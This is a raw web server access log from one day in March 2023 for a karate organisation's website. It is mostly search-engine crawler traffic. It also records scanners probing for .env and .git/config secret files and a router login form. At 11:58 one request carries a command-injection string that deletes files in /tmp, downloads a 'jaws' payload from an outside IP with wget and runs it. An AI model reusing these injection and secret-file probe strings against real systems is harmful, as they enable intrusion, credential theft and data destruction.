::ffff:51.222.253.6 - - [22/Mar/2023:05:52:05 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [22/Mar/2023:05:52:05 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [22/Mar/2023:05:52:06 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [22/Mar/2023:05:52:07 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [22/Mar/2023:05:52:07 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [22/Mar/2023:05:52:08 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [22/Mar/2023:05:52:08 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [22/Mar/2023:05:52:09 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [22/Mar/2023:05:52:10 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:114.119.132.9 - - [22/Mar/2023:06:00:16 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.1" 200 766218 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:17.241.227.72 - - [22/Mar/2023:06:10:33 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.241.227.72 - - [22/Mar/2023:06:10:33 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:3.231.226.13 - - [22/Mar/2023:06:12:37 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:205.210.31.30 - - [22/Mar/2023:06:12:41 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:3.231.226.13 - - [22/Mar/2023:06:13:00 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:3.231.226.13 - - [22/Mar/2023:06:17:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:165.227.0.21 - - [22/Mar/2023:06:22:03 +0000] "GET / HTTP/1.0" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
::ffff:35.240.44.240 - - [22/Mar/2023:06:28:11 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.28.2"
::ffff:52.167.144.44 - - [22/Mar/2023:06:28:53 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:45.33.80.243 - - [22/Mar/2023:06:41:51 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:157.55.39.220 - - [22/Mar/2023:06:42:06 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:3.142.70.117 - - [22/Mar/2023:06:55:34 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.142.70.117 - - [22/Mar/2023:06:55:35 +0000] "GET /yuuki?pp=env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
::ffff:3.142.70.117 - - [22/Mar/2023:06:55:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.142.70.117 - - [22/Mar/2023:06:55:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:113.108.9.38 - - [22/Mar/2023:07:04:59 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:66.249.66.85 - - [22/Mar/2023:07:05:00 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [22/Mar/2023:07:05:27 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:07:07:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:07:07:48 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:129.146.125.219 - - [22/Mar/2023:07:22:59 +0000] "HEAD / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:22:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:22:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:22:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:23:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:23:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:129.146.125.219 - - [22/Mar/2023:07:23:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:114.119.150.140 - - [22/Mar/2023:07:31:46 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:27.124.12.16 - - [22/Mar/2023:07:38:27 +0000] "GET /vplayer/171943.html HTTP/1.1" 404 158 "/vplayer/171943.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:107.170.231.15 - - [22/Mar/2023:07:43:43 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:34.77.127.183 - - [22/Mar/2023:07:46:30 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.28.2"
::ffff:66.249.66.87 - - [22/Mar/2023:07:50:00 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:40.77.167.190 - - [22/Mar/2023:07:58:51 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:193.151.146.61 - - [22/Mar/2023:08:01:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:159.203.192.9 - - [22/Mar/2023:08:05:33 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:114.119.158.45 - - [22/Mar/2023:08:07:37 +0000] "GET /events HTTP/1.1" 200 5867 "http://34.212.47.6/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:100.20.101.152 - - [22/Mar/2023:08:17:52 +0000] "GET / HTTP/1.1" 200 57378 "-" "go-resty/2.7.0 (https://github.com/go-resty/resty)"
::ffff:103.253.25.16 - - [22/Mar/2023:08:18:28 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
::ffff:154.17.78.200 - - [22/Mar/2023:08:18:29 +0000] "POST /sendemail HTTP/1.1" 302 41 "wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
::ffff:154.17.78.200 - - [22/Mar/2023:08:18:30 +0000] "GET /contact/?err=error HTTP/1.1" 200 10572 "http://wadokikai.org/sendemail" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
::ffff:52.167.144.44 - - [22/Mar/2023:08:23:14 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 200 82719 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:08:23:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:08:23:50 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Mar/2023:08:28:30 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:143.42.191.19 - - [22/Mar/2023:08:29:01 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) Chrome/98.0.4758.132 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:08:29:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:08:29:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.136.30 - - [22/Mar/2023:09:06:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.138.99 - - [22/Mar/2023:09:16:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:54.36.148.10 - - [22/Mar/2023:09:32:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [22/Mar/2023:09:32:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:43.155.118.219 - - [22/Mar/2023:09:52:54 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:09:59:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:09:59:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:186.158.228.41 - - [22/Mar/2023:10:00:59 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:10:04:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.151.151 - - [22/Mar/2023:10:09:07 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:94.102.51.9 - - [22/Mar/2023:10:15:22 +0000] "GET / HTTP/1.0" 200 57378 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:94.102.51.9 - - [22/Mar/2023:10:15:35 +0000] "GET / HTTP/1.0" 200 57378 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:14.29.231.172 - - [22/Mar/2023:10:22:58 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:45.56.108.128 - - [22/Mar/2023:10:54:13 +0000] "GET /systembc/password.php HTTP/1.0" 404 160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:11:01:16 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:11:01:16 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:161.35.233.14 - - [22/Mar/2023:11:08:52 +0000] "GET /explore HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
::ffff:43.155.118.219 - - [22/Mar/2023:11:15:00 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:11:26:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:11:26:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.167.144.44 - - [22/Mar/2023:11:41:24 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.196 - - [22/Mar/2023:11:41:56 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.196 - - [22/Mar/2023:11:41:57 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:59.89.3.212 - - [22/Mar/2023:11:58:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:118.123.1.35 - - [22/Mar/2023:11:58:51 +0000] "GET /scripts/LoadAjaxIco.js HTTP/1.1" 404 161 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:102.67.224.121 - - [22/Mar/2023:11:59:40 +0000] "HEAD / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:102.67.224.121 - - [22/Mar/2023:11:59:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:102.67.224.121 - - [22/Mar/2023:11:59:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:102.67.224.121 - - [22/Mar/2023:11:59:43 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:54.36.112.44 - - [22/Mar/2023:12:11:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:12:11:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.28.242.71 - - [22/Mar/2023:12:19:47 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.28.242.71 - - [22/Mar/2023:12:19:48 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:12:19:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:12:19:58 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:94.102.51.9 - - [22/Mar/2023:12:19:59 +0000] "GET / HTTP/1.0" 200 57378 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:94.102.51.9 - - [22/Mar/2023:12:20:00 +0000] "GET / HTTP/1.0" 200 57378 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:37.194.116.176 - - [22/Mar/2023:12:20:51 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:64.62.197.201 - - [22/Mar/2023:12:26:11 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:64.62.197.198 - - [22/Mar/2023:12:27:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
::ffff:64.62.197.197 - - [22/Mar/2023:12:27:49 +0000] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:43.155.118.219 - - [22/Mar/2023:12:38:11 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:12:51:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:12:51:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.148.78 - - [22/Mar/2023:12:55:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [22/Mar/2023:12:55:41 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [22/Mar/2023:12:55:43 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [22/Mar/2023:12:55:44 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [22/Mar/2023:12:55:45 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [22/Mar/2023:12:55:45 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [22/Mar/2023:12:55:46 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [22/Mar/2023:12:55:47 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [22/Mar/2023:12:55:47 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [22/Mar/2023:12:55:48 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [22/Mar/2023:12:55:48 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [22/Mar/2023:12:55:49 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [22/Mar/2023:12:55:50 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
